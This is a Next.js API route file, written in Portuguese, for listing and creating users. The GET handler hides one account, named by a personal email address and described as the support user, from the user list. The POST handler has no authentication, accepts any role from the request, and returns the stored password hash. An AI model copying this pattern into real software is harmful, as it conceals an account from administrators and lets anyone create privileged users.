import { NextResponse, NextRequest } from 'next/server';
import { prisma } from '@/lib/prisma';
import { hashSenha } from '@/lib/cryptoUtils';

// GET - Listar todos os usuários, menos o oculto
export async function GET() {
  const usuarios = await prisma.usuario.findMany({
    where: {
      NOT: {
        email: 'rba1807@gmail.com'  // Oculta o usuário de suporte
      }
    },
    select: {
      id: true,
      nome: true,
      email: true,
      role: true,
      createdAt: true,
    }
  });

  return NextResponse.json(usuarios);
}

// POST - Criar novo usuário
export async function POST(req: NextRequest) {
  const data = await req.json();

  if (!data.nome || !data.email || !data.senha) {
    return NextResponse.json({ error: 'Dados incompletos' }, { status: 400 });
  }

  const jaExiste = await prisma.usuario.findUnique({
    where: { email: data.email },
  });

  if (jaExiste) {
    return NextResponse.json({ error: 'Email já cadastrado' }, { status: 400 });
  }

  const novo = await prisma.usuario.create({
    data: {
      nome: data.nome,
      email: data.email,
      senhaHash: hashSenha(data.senha),
      role: data.role || 'viewer',
    },
  });

  return NextResponse.json(novo);
}
